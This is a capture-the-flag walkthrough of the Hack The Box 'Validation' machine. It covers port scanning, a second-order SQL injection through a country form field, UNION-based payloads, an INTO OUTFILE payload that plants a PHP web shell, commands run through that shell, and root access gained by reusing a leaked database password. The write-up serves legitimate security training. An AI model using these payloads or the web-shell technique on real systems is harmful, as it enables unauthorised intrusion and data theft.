# Hack The Box: Validation

**Difficulty:** Easy
**OS:** Linux

Validation is an Easy-level Linux machine designed to demonstrate the risks of Second-Order SQL Injection and insecure database user permissions. The initial foothold is achieved by discovering an SQL injection vulnerability in a country selection field, exploiting it to read and write files to the web directory. Privilege escalation is straightforward, relying on password reuse from the database.

---

## Reconnaissance

The assessment begins with a port scan to identify the services running on the target.

```bash
nmap -p- --min-rate 5000 10.10.11.116
nmap -p 22,80,4566,8080 -sCV 10.10.11.116
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.48)
*   **Port 4566:** HTTP (nginx, returns 403 Forbidden)
*   **Port 8080:** HTTP (nginx, returns 502 Bad Gateway)

We focus our initial enumeration on the web application hosted on port 80.

## Web Application Analysis

Navigating to port 80 displays a registration page for a "UHC" (Ultimate Hacking Championship) event. The form requires a username and a country selection.

When we submit a username (e.g., `testuser`) and a country (e.g., `Brazil`), the application redirects to `/account.php`, setting a cookie in the process.

```text
Set-Cookie: user=f838c8ea492c8efc627e5738309f7f9e
```

The cookie appears to be an MD5 hash of the submitted username. This predictable session management is a poor security practice, but our primary focus is on how the application processes our input.

### Second-Order SQL Injection

We intercept the registration POST request using Burp Suite to analyze the parameters:
```text
username=testuser&country=Brazil
```

We test the `username` field for standard SQL injection (e.g., submitting `testuser'`), but the application handles it safely. Next, we test the `country` field.

We submit a request with a single quote injected into the `country` parameter:
```text
username=testuser2&country=Brazil'
```

The server responds with a standard 302 redirect. However, when we use the newly assigned cookie to visit `/account.php`, the page displays a fatal SQL syntax error.

This behavior confirms a **Second-Order SQL Injection**. The payload is safely inserted into the database initially, but it triggers an error later when it is retrieved and unsafely concatenated into a new query to render the `/account.php` page.

### Exploiting the SQL Injection

The error message and behavior suggest the query rendering `/account.php` looks something like this:
```sql
SELECT username FROM players WHERE country = '[input]';
```

We can exploit this using a `UNION SELECT` statement. We need to match the number of columns in the original query (which appears to be one: `username`).

We craft a payload to test the UNION injection:
```text
username=testuser3&country=Brazil' UNION SELECT 1;-- -
```

After submitting this registration and loading `/account.php`, the number `1` is displayed alongside the users from Brazil, confirming code execution within the database context.

We can further enumerate the database user by injecting `user()`:
```text
username=testuser4&country=Brazil' UNION SELECT user();-- -
```
The output reveals the database user is `uhc@localhost`.

## Initial Access via SQLi

With execution in the database confirmed, we check if the `uhc@localhost` user has the `FILE` privilege, which allows reading and writing files to the filesystem.

We test this by attempting to write a simple string into a file in the web root (typically `/var/www/html/`).

```text
username=testuser5&country=Brazil' UNION SELECT "test_write" INTO OUTFILE '/var/www/html/test.txt';-- -
```

Navigating to `http://10.10.11.116/test.txt` successfully displays "test_write", confirming that the database user has write permissions to the web directory.

We leverage this capability to write a PHP web shell to the server.

```text
username=testuser6&country=Brazil' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';-- -
```

We navigate to our uploaded web shell and execute commands:
```bash
curl http://10.10.11.116/shell.php?cmd=id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

From here, we can spawn a reverse shell or read the `user.txt` flag located in the home directory of the local user (if readable by `www-data`, or we must pivot first). Reviewing the filesystem, we find a user named `htb`.

```bash
curl http://10.10.11.116/shell.php?cmd=cat+/home/htb/user.txt
```

## Privilege Escalation

While exploring the file system as `www-data`, we analyze the application's source code, primarily looking for database credentials.

We locate the database configuration file (e.g., `config.php` discovered during initial directory enumeration).

```bash
curl http://10.10.11.116/shell.php?cmd=cat+config.php
```

The configuration file reveals the credentials used by the web application to connect to the database:
```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";
  // ...
?>
```

### Password Reuse

A common misconfiguration is password reuse between application services and system accounts. We test the database password (`uhc-9qual-global-pw`) against the root user account via `su` or SSH.

We can establish an interactive SSH session or a clean reverse shell and attempt to escalate privileges.

```bash
su root
Password: uhc-9qual-global-pw
```

The password is accepted, granting immediate root access to the system.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained.
